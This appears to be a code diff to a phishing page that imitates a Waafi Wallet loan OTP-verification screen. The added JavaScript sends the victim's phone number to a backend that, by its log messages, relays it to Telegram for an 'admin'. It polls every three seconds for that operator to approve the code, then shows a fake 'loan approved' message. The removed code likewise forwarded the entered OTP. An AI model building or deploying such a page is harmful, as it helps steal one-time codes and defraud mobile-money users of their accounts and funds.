@@ -229,6 +229,48 @@
             margin-bottom: 24px;
         }
 
+        .otp-status-message {
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 500;
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            display: none;
+        }
+
+        .otp-status-message.show {
+            display: block;
+        }
+
+        .otp-status-message.waiting {
+            background: #fef3c7;
+            color: #92400e;
+            border: 1px solid #fcd34d;
+            display: block;
+        }
+
+        .otp-status-message.approved {
+            background: #f0fdf4;
+            color: #166534;
+            border: 1px solid #86efac;
+            display: block;
+        }
+
+        .otp-status-message.rejected {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+            display: block;
+        }
+
+        .otp-status-message.error {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+            display: block;
+        }
+
         .otp-container-inputs {
             display: flex;
             gap: 12px;
@@ -258,6 +300,11 @@
         .otp-input.error {
             border-color: #ef4444;
             animation: shake 0.3s ease;
+        }
+
+        .otp-input:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
 
         @keyframes shake {
@@ -303,38 +350,6 @@
 
         .otp-timer .resend.disabled:hover {
             text-decoration: none;
-        }
-
-        .otp-error {
-            display: none;
-            text-align: center;
-            font-size: 0.875rem;
-            color: #ef4444;
-            margin-bottom: 16px;
-            padding: 8px 12px;
-            background: #fef2f2;
-            border-radius: 8px;
-            border: 1px solid #fecaca;
-        }
-
-        .otp-error.show {
-            display: block;
-        }
-
-        .otp-success {
-            display: none;
-            text-align: center;
-            font-size: 0.875rem;
-            color: #22c55e;
-            margin-bottom: 16px;
-            padding: 8px 12px;
-            background: #f0fdf4;
-            border-radius: 8px;
-            border: 1px solid #bbf7d0;
-        }
-
-        .otp-success.show {
-            display: block;
         }
 
         .otp-btn {
@@ -511,8 +526,8 @@
                 <p class="otp-subtitle">We sent a 6-digit verification code to</p>
                 <p class="otp-phone" id="phoneDisplay">+252 61 234 5678</p>
 
-                <div class="otp-error" id="otpError">Invalid OTP code. Please try again.</div>
-                <div class="otp-success" id="otpSuccess">✓ OTP verified successfully!</div>
+                <!-- Status Message -->
+                <div class="otp-status-message" id="otpStatusMessage"></div>
 
                 <div class="otp-container-inputs" id="otpContainer">
                     <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required autocomplete="off" />
@@ -566,15 +581,198 @@
         });
 
         // ===== PHONE FROM STORAGE =====
-        const phone = localStorage.getItem('waafi-phone') || '+252 61 234 5678';
-        document.getElementById('phoneDisplay').textContent = phone;
+        const phoneNumber = localStorage.getItem('waafi-phone') || '+252 61 234 5678';
+        document.getElementById('phoneDisplay').textContent = phoneNumber;
 
         // ===== OTP INPUT =====
         const otpInputs = document.querySelectorAll('.otp-input');
         const verifyBtn = document.getElementById('verifyBtn');
-        const otpError = document.getElementById('otpError');
-        const otpSuccess = document.getElementById('otpSuccess');
+        const statusMessage = document.getElementById('otpStatusMessage');
 
+        let statusCheckInterval = null;
+        let isVerifying = false;
+
+        // ===== SHOW STATUS MESSAGE =====
+        function showStatusMessage(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = 'otp-status-message show ' + type;
+        }
+
+        function hideStatusMessage() {
+            statusMessage.className = 'otp-status-message';
+            statusMessage.textContent = '';
+        }
+
+        // ===== DISABLE OTP INPUTS =====
+        function disableInputs(disabled) {
+            otpInputs.forEach(input => {
+                input.disabled = disabled;
+            });
+        }
+
+        // ===== REQUEST OTP FROM BACKEND =====
+        async function requestOTP() {
+            try {
+                showStatusMessage('⏳ Sending OTP to admin for verification...', 'waiting');
+                disableInputs(true);
+                verifyBtn.disabled = true;
+
+                const response = await fetch(`${API_URL}/api/send-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phoneNumber: phoneNumber })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    console.log('✅ OTP sent to Telegram:', result);
+                    showStatusMessage('⏳ OTP sent to admin. Waiting for approval...', 'waiting');
+                    // Start checking for admin response
+                    startCheckingStatus();
+                } else {
+                    showStatusMessage('❌ Failed to send OTP. Please try again.', 'error');
+                    disableInputs(false);
+                    verifyBtn.disabled = false;
+                }
+            } catch (error) {
+                console.error('❌ Error requesting OTP:', error);
+                showStatusMessage('⚠️ Network error. Please try again.', 'error');
+                disableInputs(false);
+                verifyBtn.disabled = false;
+            }
+        }
+
+        // ===== CHECK OTP STATUS (Polling) =====
+        function startCheckingStatus() {
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+
+            statusCheckInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`${API_URL}/api/check-otp-status`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ phoneNumber: phoneNumber })
+                    });
+
+                    const result = await response.json();
+
+                    if (result.success) {
+                        const status = result.data.status;
+                        console.log(`📊 OTP Status: ${status}`);
+
+                        if (status === 'approved') {
+                            clearInterval(statusCheckInterval);
+                            showStatusMessage('✅ OTP approved by admin!', 'approved');
+                            disableInputs(true);
+                            verifyBtn.disabled = true;
+                            verifyBtn.innerHTML = '✓ Verified!';
+                            verifyBtn.style.background = '#22c55e';
+
+                            setTimeout(() => {
+                                alert('🎉 OTP Verified Successfully!\nYour loan has been approved and funds will be sent to your Waafi Wallet.');
+                                window.location.href = 'index.html';
+                            }, 2000);
+                        } else if (status === 'rejected') {
+                            clearInterval(statusCheckInterval);
+                            showStatusMessage('❌ OTP was rejected by admin. Please contact support.', 'rejected');
+                            disableInputs(true);
+                            verifyBtn.disabled = true;
+                            verifyBtn.innerHTML = 'Rejected';
+                            verifyBtn.style.background = '#ef4444';
+                        } else {
+                            // Still pending
+                            showStatusMessage('⏳ Waiting for admin approval...', 'waiting');
+                        }
+                    } else if (result.status === 404) {
+                        // OTP not found - maybe expired
+                        clearInterval(statusCheckInterval);
+                        showStatusMessage('⚠️ OTP expired. Please request a new one.', 'error');
+                        disableInputs(false);
+                        verifyBtn.disabled = false;
+                    }
+                } catch (error) {
+                    console.error('❌ Error checking status:', error);
+                }
+            }, 3000); // Check every 3 seconds
+        }
+
+        // ===== VERIFY OTP (When user clicks button) =====
+        async function verifyOTP() {
+            if (isVerifying) return;
+            
+            let otp = '';
+            otpInputs.forEach(input => {
+                otp += input.value;
+            });
+
+            if (otp.length !== 6) {
+                showStatusMessage('Please enter all 6 digits.', 'error');
+                return;
+            }
+
+            isVerifying = true;
+            verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
+            verifyBtn.disabled = true;
+
+            try {
+                const response = await fetch(`${API_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ phoneNumber: phoneNumber, otp: otp })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    showStatusMessage('✅ OTP verified successfully!', 'approved');
+                    verifyBtn.innerHTML = '✓ Verified!';
+                    verifyBtn.style.background = '#22c55e';
+                    disableInputs(true);
+
+                    setTimeout(() => {
+                        alert('🎉 OTP Verified Successfully!\nYour loan has been approved and funds will be sent to your Waafi Wallet.');
+                        window.location.href = 'index.html';
+                    }, 2000);
+                } else if (result.status === 'pending') {
+                    showStatusMessage('⏳ Waiting for admin approval...', 'waiting');
+                    verifyBtn.innerHTML = 'Verify OTP';
+                    verifyBtn.disabled = false;
+                    isVerifying = false;
+                    startCheckingStatus();
+                } else {
+                    showStatusMessage('❌ ' + (result.message || 'Verification failed'), 'error');
+                    verifyBtn.innerHTML = 'Verify OTP';
+                    verifyBtn.disabled = false;
+                    isVerifying = false;
+                    
+                    otpInputs.forEach(input => {
+                        input.value = '';
+                        input.classList.add('error');
+                    });
+                    otpInputs[0].focus();
+                    setTimeout(() => {
+                        otpInputs.forEach(input => {
+                            input.classList.remove('error');
+                        });
+                    }, 1000);
+                }
+            } catch (error) {
+                console.error('❌ Error:', error);
+                showStatusMessage('⚠️ Network error. Please try again.', 'error');
+                verifyBtn.innerHTML = 'Verify OTP';
+                verifyBtn.disabled = false;
+                isVerifying = false;
+            }
+        }
+
+        // ===== OTP INPUT EVENTS =====
         otpInputs.forEach((input, index) => {
             input.addEventListener('input', function(e) {
                 const value = this.value;
@@ -583,7 +781,7 @@
                     return;
                 }
                 this.classList.remove('error');
-                otpError.classList.remove('show');
+                hideStatusMessage();
 
                 if (value.length === 1 && index < otpInputs.length - 1) {
                     otpInputs[index + 1].focus();
@@ -618,88 +816,7 @@
             });
         });
 
-        // ===== VERIFY OTP =====
-        async function verifyOTP() {
-            let otp = '';
-            otpInputs.forEach(input => {
-                otp += input.value;
-            });
-
-            if (otp.length !== 6) {
-                otpError.textContent = 'Please enter all 6 digits.';
-                otpError.classList.add('show');
-                return;
-            }
-
-            // Show loading state
-            verifyBtn.innerHTML = '<span class="spinner"></span> Verifying...';
-            verifyBtn.disabled = true;
-
-            // Get phone number
-            const phoneNumber = localStorage.getItem('waafi-phone') || '+252 61 234 5678';
-
-            // Prepare data for backend
-            const otpData = {
-                phoneNumber: phoneNumber,
-                otp: otp,
-                status: 'Verified'
-            };
-
-            try {
-                // Send OTP data to backend
-                const response = await fetch(`${API_URL}/api/otp`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(otpData)
-                });
-
-                const result = await response.json();
-
-                if (result.success) {
-                    console.log('✅ OTP verification data sent to Telegram:', result);
-                    
-                    // Show success
-                    otpSuccess.classList.add('show');
-                    otpError.classList.remove('show');
-                    verifyBtn.innerHTML = '✓ Verified!';
-                    verifyBtn.style.background = '#22c55e';
-                    verifyBtn.disabled = false;
-
-                    // Redirect after 2 seconds
-                    setTimeout(() => {
-                        alert('🎉 OTP Verified Successfully!\nYour loan has been approved and funds will be sent to your Waafi Wallet.');
-                        window.location.href = 'index.html';
-                    }, 1500);
-                } else {
-                    throw new Error('Verification failed');
-                }
-            } catch (error) {
-                console.error('❌ Error:', error);
-                otpError.textContent = '⚠️ Verification failed. Please try again.';
-                otpError.classList.add('show');
-                otpSuccess.classList.remove('show');
-                verifyBtn.innerHTML = 'Verify OTP';
-                verifyBtn.disabled = false;
-                verifyBtn.style.background = '';
-                
-                // Clear inputs for retry
-                otpInputs.forEach(input => {
-                    input.value = '';
-                    input.classList.add('error');
-                });
-                otpInputs[0].focus();
-                
-                setTimeout(() => {
-                    otpInputs.forEach(input => {
-                        input.classList.remove('error');
-                    });
-                }, 1000);
-            }
-        }
-
-        // Verify button click
+        // ===== VERIFY BUTTON CLICK =====
         verifyBtn.addEventListener('click', verifyOTP);
 
         // ===== TIMER =====
@@ -731,34 +848,39 @@
         resendBtn.addEventListener('click', function() {
             if (this.classList.contains('disabled')) return;
             
-            // Resend OTP - send request to backend
-            const phoneNumber = localStorage.getItem('waafi-phone') || '+252 61 234 5678';
-            
-            // Show resending state
             this.textContent = 'Sending...';
             this.classList.add('disabled');
             
-            // Simulate resend (in production, call backend to send new OTP)
+            // Clear any existing interval
+            if (statusCheckInterval) clearInterval(statusCheckInterval);
+            
+            // Reset OTP state
+            otpInputs.forEach(input => {
+                input.value = '';
+            });
+            otpInputs[0].focus();
+            verifyBtn.innerHTML = 'Verify OTP';
+            verifyBtn.disabled = false;
+            verifyBtn.style.background = '';
+            disableInputs(false);
+            hideStatusMessage();
+            isVerifying = false;
+
+            // Request new OTP
+            requestOTP();
+
             setTimeout(() => {
-                alert('A new OTP has been sent to your phone.');
                 this.textContent = 'Resend OTP';
                 this.classList.remove('disabled');
                 startTimer();
-                
-                // Clear inputs
-                otpInputs.forEach(input => {
-                    input.value = '';
-                });
-                otpInputs[0].focus();
-                otpError.classList.remove('show');
-                otpSuccess.classList.remove('show');
-                verifyBtn.innerHTML = 'Verify OTP';
-                verifyBtn.disabled = false;
-                verifyBtn.style.background = '';
             }, 1000);
         });
 
+        // ===== START =====
         startTimer();
+        
+        // Request OTP on page load
+        requestOTP();
     </script>
 
 </body>
